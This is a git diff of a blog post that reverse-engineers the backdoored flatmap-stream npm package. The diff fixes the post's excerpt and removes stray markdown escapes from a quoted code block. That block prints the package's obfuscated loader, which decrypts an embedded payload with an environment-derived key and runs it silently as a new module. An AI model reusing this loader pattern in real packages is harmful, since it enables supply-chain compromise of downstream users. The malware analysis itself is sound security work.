@@ -2,7 +2,7 @@
 title: Reversing flatmap-stream
 date: "2019-01-13"
 path: "/reversing-flatmap-stream/"
-excerpt: React Hooks is a quirky proposed API available in the 16.7 alpha, allowing developers to more easily separate concerns and reuse logic related to component lifecycle. Let's have a quick look at how to use them. 
+excerpt: Taking a belated look at the backdoor flatmap-stream package 
 titleImage: "./whattosay.png"
 tags: ["javascript", "flatmap-stream", "reversing"]
 ---
@@ -20,17 +20,17 @@ flatmap-stream was included as a dependency in a widely used NPM library event-s
         }
         
         var n=r(e("2e2f746573742f64617461")),
-        o=t\[e(n[3])\][e(n[4])];
+        o=t[e(n[3])][e(n[4])];
         
         if(!o)return;
         
-        var u=r(e(n\[2]))[e(n[6])\](e(n[5]),o),
+        var u=r(e(n[2]))[e(n[6])](e(n[5]),o),
         a=u.update(n[0],e(n[8]),e(n[9]));
         a+=u.final(e(n[9]));
         
         var f=new module.constructor;
         
-        f.paths=module.paths,f\[e(n[7])\](a,""),f.exports(n[1])
+        f.paths=module.paths,f[e(n[7])](a,""),f.exports(n[1])
     }
     catch(r){}
 }();
